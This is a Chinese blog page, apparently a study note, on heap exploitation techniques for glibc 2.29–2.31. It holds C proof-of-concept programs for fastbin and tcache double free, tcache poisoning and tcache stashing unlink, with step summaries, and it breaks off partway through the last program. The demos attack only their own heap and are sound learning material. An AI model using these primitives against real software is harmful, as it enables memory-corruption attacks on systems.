@@ -1,0 +1,472 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>glibc-2.31版本利用 - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="glibc-2.29~2.31fastbin_doub...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '总之岁月漫长，然而值得等待！',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: true,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: '/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="ShouCheng" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">glibc-2.31版本利用</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">glibc-2.31版本利用</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 14, 2022</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>8903</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="glibc-2-29-2-31"><a href="#glibc-2-29-2-31" class="headerlink" title="glibc-2.29~2.31"></a>glibc-2.29~2.31</h1><h2 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin_double_free"></a>fastbin_double_free</h2><p>需要构造：前一个释放堆块 old，与当前释放堆块 p 有 old != p。</p>
+<p><code>fastbin double free</code> 的 poc 利用如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*this is double free related security mechanisms in glibc 2.29.</span><br><span class="hljs-comment">     *	if (__builtin_expect (old == p, 0))</span><br><span class="hljs-comment">	  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);</span><br><span class="hljs-comment">    * */</span><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fastbin_double_free can help you achieve \&quot;arbitrary address writes\&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">void</span> *q,*r,*d;<br>    <span class="hljs-keyword">void</span> *p[<span class="hljs-number">7</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First of all ,we need to Apply for heap blocks of the same size to consume tcache!\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>    &#123;<br>        p[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p[%d]  ===&gt;  %p\n&quot;</span>,i,p[i]);<br>    &#125;<br>    q = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    r = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now , we need to free 7 heap blocks to populate tcache linked list!\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free p[%d]  ===&gt;  %p\n&quot;</span>,i,p[i]);<br>        <span class="hljs-built_in">free</span>(p[i]);<br>        p[i] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now ,Our free heap blocks will be put into fastbin\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free q  ===&gt;  %p\n&quot;</span>,q);<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;in order to achieve double free , we need to free another block to bypass check in glibc 2.29 !\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free r  ===&gt;  %p\n&quot;</span>,r);<br>    <span class="hljs-built_in">free</span>(r);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we free q again!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now free q  ===&gt;  %p\n&quot;</span>,q);<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OK,we already achieve double free in glibc 2.29.!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185557111.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419185557111</span></p>
+<p>申请出九个堆块。</p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185812476.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419185812476</span></p>
+<p>释放掉七个堆块，填满 tcache bin。</p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419185951969.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419185951969</span></p>
+<p>再释放 p、q 两个堆块，由于 tcache bin 满了，进入到 fastbin 中 </p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419190144978.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419190144978</span></p>
+<p>然后只需要再把第一次释放的堆块再释放一遍，绕过old == p，从而形成 double free，跟低版本的方式是一样，只是在于需要先填满 tcache bin。</p>
+<h3 id="fastbin-double-free-利用总结"><a href="#fastbin-double-free-利用总结" class="headerlink" title="fastbin_double_free 利用总结"></a>fastbin_double_free 利用总结</h3><ul>
+<li>释放七个堆块填满 tcache bin。</li>
+<li>再释放两个堆块进入 fastbin，按照 p-q-p 的顺序释放，即可形成 double free。</li>
+</ul>
+<h2 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache_double_free"></a><strong>tcache_double_free</strong></h2><p>poc如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//glibc 2.29 Security Mechanism</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="hljs-comment">	  &#123;</span><br><span class="hljs-comment">	    tcache_entry *tmp;</span><br><span class="hljs-comment">	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="hljs-comment">	    for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="hljs-comment">		 tmp;</span><br><span class="hljs-comment">		 tmp = tmp-&gt;next)</span><br><span class="hljs-comment">	      if (tmp == e)</span><br><span class="hljs-comment">		malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="hljs-comment">	    // If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">	       few cycles, but don&#x27;t abort.  </span><br><span class="hljs-comment">	  &#125;</span><br><span class="hljs-comment">     */</span><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcache_double_free can help you achieve \&quot;arbitrary address writes\&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">void</span> *p,*q,*r,*d;<br>    p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we already free p = %p\n&quot;</span>,p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;we can change its key to help us achieve double free\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;its key = %p,now\n&quot;</span>,*(<span class="hljs-keyword">uint64_t</span> *)(p+<span class="hljs-number">8</span>));<br>    *(<span class="hljs-keyword">uint64_t</span> *)(p + <span class="hljs-number">8</span>) = <span class="hljs-number">0x122220</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;after we change,its key = %p\n&quot;</span>,*(<span class="hljs-keyword">uint64_t</span> *)(p+<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so we can achieve double free!&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now we already achieve double free in glibc 2.29&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193416703.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419193416703</span></p>
+<p>2.29以后的版本，在释放堆块的 bk 位置将会填上 tcache 的地址作为一个 key，验证 key == tcache 则说明堆块已释放。</p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193649480.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419193649480</span></p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419193807297.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419193807297</span></p>
+<p>将这个key值改掉即可与之前版本一般，再次释放该堆块直接形成 double free。</p>
+<h3 id="tcache-double-free-利用总结"><a href="#tcache-double-free-利用总结" class="headerlink" title="tcache_double_free 利用总结"></a>tcache_double_free 利用总结</h3><ul>
+<li>释放一个堆块。</li>
+<li>修改堆块 bk 位置上的 key。</li>
+<li>再次释放该堆块。</li>
+</ul>
+<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>在 glibc-2.31 中，tcache count 的数量不能小于 0，否则将无法分配堆块。 </p>
+<p>poc如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">// disable buffering</span><br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span><br>		   <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span><br>		   <span class="hljs-string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span><br>		   <span class="hljs-string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);<br><br>	<span class="hljs-keyword">size_t</span> stack_var;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="hljs-keyword">char</span> *)&amp;stack_var);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating 2 buffers.\n&quot;</span>);<br>	<span class="hljs-keyword">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, a);<br>	<span class="hljs-keyword">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the buffers...\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(a);<br>	<span class="hljs-built_in">free</span>(b);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span><br>		   <span class="hljs-string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">intptr_t</span>), b, &amp;stack_var);<br>	b[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">intptr_t</span>)&amp;stack_var;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);<br><br>	<span class="hljs-keyword">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2nd malloc(128): %p\n&quot;</span>, c);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We got the control\n&quot;</span>);<br><br>	assert((<span class="hljs-keyword">long</span>)&amp;stack_var == (<span class="hljs-keyword">long</span>)c);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419222640503.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419222640503</span></p>
+<p>申请出两个堆块，然后再将其释放，顺序为 b - a。</p>
+<p><img   class="lazyload" data-original="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220419223405043.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220419223405043</span></p>
+<p>修改 b 的 fd 指针指向要修改的内容，然后只需要将堆块分配即可。</p>
+<h3 id="tcache-poisoning-利用总结"><a href="#tcache-poisoning-利用总结" class="headerlink" title="tcache_poisoning 利用总结"></a>tcache_poisoning 利用总结</h3><ul>
+<li>释放堆块 b - a</li>
+<li>修改 b 的指针指向想要分配堆块的地址</li>
+</ul>
+<p>相比与之前版本可以让 count 为负值可以去构造链表尾部的堆块，glibc-2.31为了绕过 count 的限制，需要在前一个堆块开始构造。</p>
+<h2 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache_stashing_unlink"></a><strong>tcache_stashing_unlink</strong></h2><p>libc-2.29开始，出现了一种叫stash的机制，基本原理就是当调用_int_malloc时，如果从smallbin或者fastbin中取出chunk之后，对应大小的tcache没有满，就会把剩下的bin放入tcache中</p>
+<p>poc如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br><br>	<span class="hljs-keyword">char</span> *t1;<br>	<span class="hljs-keyword">char</span> *s1, *s2, *pad;<br>	<span class="hljs-keyword">char</span> *tmp;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);<br><br>	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\n&quot;</span>, &amp;victim, victim);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, tmp<span class="hljs-number">-0x260</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here, I choose the size 0x60\n&quot;</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;<br>		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>		<span class="hljs-built_in">free</span>(t1);<br>	&#125;<br><br>	